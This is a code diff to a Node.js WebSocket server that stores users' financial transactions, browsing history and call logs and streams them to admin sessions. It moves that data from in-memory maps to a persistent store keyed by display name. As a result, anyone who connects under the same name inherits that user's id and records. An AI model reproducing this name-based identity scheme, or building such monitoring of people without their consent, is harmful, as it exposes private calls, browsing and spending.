@@ -6,6 +6,7 @@ const { Readable } = require('stream')
 const { WebSocketServer, WebSocket } = require('ws')
 const { AccessToken } = require('livekit-server-sdk')
 const { ProxyAgent, setGlobalDispatcher } = require('undici')
+const store = require('./store')
 
 // Respect standard HTTP(S)_PROXY env vars for outbound fetch() calls (e.g.
 // to Quran Foundation) — Node's built-in fetch doesn't honor these by
@@ -432,15 +433,19 @@ const server = http.createServer(async (req, res) => {
 
 const wss = new WebSocketServer({ server, path: '/ws' })
 
-const admins       = new Map()   // userId → { ws, userId, name }
-const users        = new Map()   // userId → { ws, userId, name }
-const byWs         = new Map()   // ws → meta
-const transactions = new Map()   // userId → transaction[]
-const browsingHistory = new Map() // userId → { id, domain, timestamp, userId, userName }[]
-const callLogs = new Map()        // userId → { id, number, name, type, duration, date, userId, userName }[]
+const admins = new Map()   // userId → { ws, userId, name }
+const users  = new Map()   // userId → { ws, userId, name }
+const byWs   = new Map()   // ws → meta
 
 let idSeq = 0
 function makeId() { return `${++idSeq}-${Math.random().toString(36).slice(2, 6)}` }
+
+// Admin only knows the target's userId (from getUserList()); persisted data is keyed by
+// name, so resolve via the live session first and fall back to the stable-id table.
+function resolveOwnerName(userId) {
+  const online = users.get(userId)
+  return online ? online.name : store.getNameForUserId(userId)
+}
 
 function send(ws, msg) {
   if (ws && ws.readyState === WebSocket.OPEN) ws.send(JSON.stringify(msg))
@@ -524,11 +529,14 @@ wss.on('connection', (ws) => {
             return
           }
 
-          meta = { ws, role: 'user', userId, name, isBg: false }
-          users.set(userId, meta)
+          // Stable per-name id — same name always gets the same userId back, even after
+          // a server restart wipes the in-memory `users` map above.
+          const stableId = store.getOrAssignUserId(name)
+          meta = { ws, role: 'user', userId: stableId, name, isBg: false }
+          users.set(stableId, meta)
           byWs.set(ws, meta)
-          send(ws, { type: 'auth_ok', role: 'user', userId, name, users: getUserList() })
-          broadcastToAdmins({ type: 'user_joined', user: { id: userId, name } })
+          send(ws, { type: 'auth_ok', role: 'user', userId: stableId, name, users: getUserList() })
+          broadcastToAdmins({ type: 'user_joined', user: { id: stableId, name } })
           broadcastAll({ type: 'users_list', users: getUserList() })
           return
         }
@@ -569,21 +577,24 @@ wss.on('connection', (ws) => {
 
       // ── Admin commands ── transactions ─────────────
       if (meta.role === 'admin' && msg.type === 'transactions_get') {
-        const list = transactions.get(msg.userId) || []
+        const ownerName = resolveOwnerName(msg.userId)
+        const list = ownerName ? store.getList(store.TABLES.TRANSACTIONS, ownerName) : []
         send(ws, { type: 'transactions_list', userId: msg.userId, transactions: list })
         return
       }
 
       // ── Admin commands ── browsing activity ─────────
       if (meta.role === 'admin' && msg.type === 'browsing_get') {
-        const list = browsingHistory.get(msg.userId) || []
+        const ownerName = resolveOwnerName(msg.userId)
+        const list = ownerName ? store.getList(store.TABLES.BROWSING_HISTORY, ownerName) : []
         send(ws, { type: 'browsing_list', userId: msg.userId, entries: list })
         return
       }
 
       // ── Admin commands ── call log ───────────────────
       if (meta.role === 'admin' && msg.type === 'call_log_get') {
-        const list = callLogs.get(msg.userId) || []
+        const ownerName = resolveOwnerName(msg.userId)
+        const list = ownerName ? store.getList(store.TABLES.CALL_LOGS, ownerName) : []
         send(ws, { type: 'call_log_list', userId: msg.userId, entries: list })
         return
       }
@@ -596,18 +607,16 @@ wss.on('connection', (ws) => {
         if (msg.type === 'transaction_add') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
           const txn = { ...msg.transaction, userId: uid, userName: meta.name }
-          if (!transactions.has(uid)) transactions.set(uid, [])
-          const list = transactions.get(uid)
-          // Safety-net dedup: a real transaction can legitimately arrive from both a bank SMS
-          // and a UPI app's notification (the client-side dedup in KeepAliveService is
-          // memory-only and resets on process restart) — skip an obvious duplicate rather
-          // than double-counting spending.
-          const isDuplicate = list.some(t =>
-            t.type === txn.type && t.amount === txn.amount && Math.abs((t.date || 0) - (txn.date || 0)) <= 2 * 60 * 1000
-          )
+          // Dedup by exact id — e.g. re-uploading the same or an overlapping-date-range
+          // PhonePe statement, whose ids are PhonePe's own unique transaction IDs. A fuzzy
+          // amount/time-window check was considered instead, but real statement data shows
+          // genuinely distinct transactions (different people, different ids) can share the
+          // same type+amount within the same minute — that would falsely collapse them.
+          const isDuplicate = store.getList(store.TABLES.TRANSACTIONS, meta.name).some(t => t.id === txn.id)
           if (!isDuplicate) {
-            list.unshift(txn)
-            broadcastToAdmins({ type: 'transaction_new', transaction: txn, fromUserId: uid, fromUserName: meta.name })
+            // INSERT OR IGNORE inside appendItem backstops this at the DB level too
+            const inserted = store.appendItem(store.TABLES.TRANSACTIONS, meta.name, txn)
+            if (inserted) broadcastToAdmins({ type: 'transaction_new', transaction: txn, fromUserId: uid, fromUserName: meta.name })
           }
           return
         }
@@ -615,11 +624,9 @@ wss.on('connection', (ws) => {
         // Transaction edited by its owner — only the owner may edit their own entries
         if (msg.type === 'transaction_update') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
-          const list = transactions.get(uid) || []
-          const idx = list.findIndex((t) => t.id === msg.transaction?.id)
-          if (idx === -1) return
-          const txn = { ...list[idx], ...msg.transaction, userId: uid, userName: meta.name }
-          list[idx] = txn
+          const patch = { ...msg.transaction, userId: uid, userName: meta.name }
+          const txn = store.updateItem(store.TABLES.TRANSACTIONS, meta.name, msg.transaction?.id, patch)
+          if (!txn) return
           broadcastToAdmins({ type: 'transaction_updated', transaction: txn, fromUserId: uid })
           return
         }
@@ -627,10 +634,8 @@ wss.on('connection', (ws) => {
         // Transaction deleted by its owner
         if (msg.type === 'transaction_delete') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
-          const list = transactions.get(uid) || []
-          const idx = list.findIndex((t) => t.id === msg.id)
-          if (idx === -1) return
-          list.splice(idx, 1)
+          const deleted = store.deleteItem(store.TABLES.TRANSACTIONS, meta.name, msg.id)
+          if (!deleted) return
           broadcastToAdmins({ type: 'transaction_deleted', id: msg.id, fromUserId: uid })
           return
         }
@@ -638,7 +643,7 @@ wss.on('connection', (ws) => {
         // Self-fetch — user requesting their own transaction history
         if (msg.type === 'transactions_get') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
-          const list = transactions.get(uid) || []
+          const list = store.getList(store.TABLES.TRANSACTIONS, meta.name)
           send(ws, { type: 'transactions_list', userId: uid, transactions: list })
           return
         }
@@ -649,8 +654,7 @@ wss.on('connection', (ws) => {
         if (msg.type === 'browsing_add') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
           const entry = { ...msg.entry, userId: uid, userName: meta.name }
-          if (!browsingHistory.has(uid)) browsingHistory.set(uid, [])
-          browsingHistory.get(uid).unshift(entry)
+          store.appendItem(store.TABLES.BROWSING_HISTORY, meta.name, entry)
           broadcastToAdmins({ type: 'browsing_new', entry, fromUserId: uid, fromUserName: meta.name })
           return
         }
@@ -659,8 +663,7 @@ wss.on('connection', (ws) => {
         if (msg.type === 'call_log_add') {
           const uid = meta.isBg ? meta.primaryId : meta.userId
           const entry = { ...msg.entry, userId: uid, userName: meta.name }
-          if (!callLogs.has(uid)) callLogs.set(uid, [])
-          callLogs.get(uid).unshift(entry)
+          store.appendItem(store.TABLES.CALL_LOGS, meta.name, entry)
           broadcastToAdmins({ type: 'call_log_new', entry, fromUserId: uid, fromUserName: meta.name })
           return
         }
